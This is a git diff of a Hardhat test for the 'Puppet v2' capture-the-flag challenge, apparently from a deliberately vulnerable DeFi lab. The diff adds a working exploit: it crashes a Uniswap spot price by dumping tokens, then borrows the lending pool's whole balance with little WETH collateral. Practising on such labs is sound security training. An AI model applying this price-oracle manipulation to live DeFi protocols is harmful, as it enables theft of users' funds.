@@ -71,7 +71,7 @@ describe('[Challenge] Puppet v2', function () {
         await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
         await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
 
-        // Ensure correct setup of pool.
+    // Ensure correct setup of pool.
         expect(
             await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('1'))
         ).to.be.eq(ethers.utils.parseEther('0.3'));
@@ -82,6 +82,64 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+      /**    
+         * UNISWAP balance = 30 TOKEN | 1 Ethers
+         * 10*10==100
+         * 10*10/(1000*(1-0.003)+100) => 9.908842297174111 will be given
+         * Final pool status: 0.0911 WETH | 1100 DVT
+         * 
+         * My Balance: 0 DVT | 34.9 ETH 
+         * Then to get all pool tokens we will apply the following 
+         * 29.49649483319732 | 0.0911*10000*3
+         * 
+         * 
+         */
+        
+      const wethAttackContract =  this.weth.connect(attacker);
+      const poolAttackContract= this.lendingPool.connect(attacker);
+      const tokenAttackContract = this.token.connect(attacker);
+      const uniswapAttackContract = this.uniswapRouter.connect(attacker);
+
+   const getBalances=async ()=>{
+
+    const wethBalance= await wethAttackContract.balanceOf(attacker.address);
+    const tokenBalance= await tokenAttackContract.balanceOf(attacker.address);
+    const poolTokenBalance= await poolAttackContract.deposits(attacker.address);
+    const ethersBalance= await ethers.provider.getBalance(attacker.address);
+
+    console.log(`wethBalance: ${ethers.utils.formatEther(wethBalance)}, tokenBalance: ${ethers.utils.formatEther(tokenBalance)}, poolTokenBalance: ${ethers.utils.formatEther(poolTokenBalance)}, ethersBalance: ${ethers.utils.formatEther(ethersBalance)}`);
+   } 
+
+
+
+      await getBalances();
+
+      await tokenAttackContract.approve(uniswapAttackContract.address,ATTACKER_INITIAL_TOKEN_BALANCE);
+      await uniswapAttackContract.swapExactTokensForTokens(
+        ATTACKER_INITIAL_TOKEN_BALANCE,
+        0,
+        [this.token.address,this.weth.address],
+        attacker.address,
+        Math.floor(Date.now()/1000)+60*10
+        );
+
+        await getBalances();
+
+        const current_deposit_needed= await poolAttackContract.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await wethAttackContract.approve(poolAttackContract.address,current_deposit_needed);
+        console.log(Number(ethers.utils.formatEther(current_deposit_needed)))
+        console.log((Number(ethers.utils.formatEther(current_deposit_needed))-9.91).toString())
+        await (await attacker.sendTransaction({
+            value:ethers.utils.parseEther((Number(ethers.utils.formatEther(current_deposit_needed))-9.90).toString()),
+
+            to:wethAttackContract.address
+        })).wait()
+
+
+        await getBalances();
+        await poolAttackContract.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        await getBalances();
+
     });
 
     after(async function () {
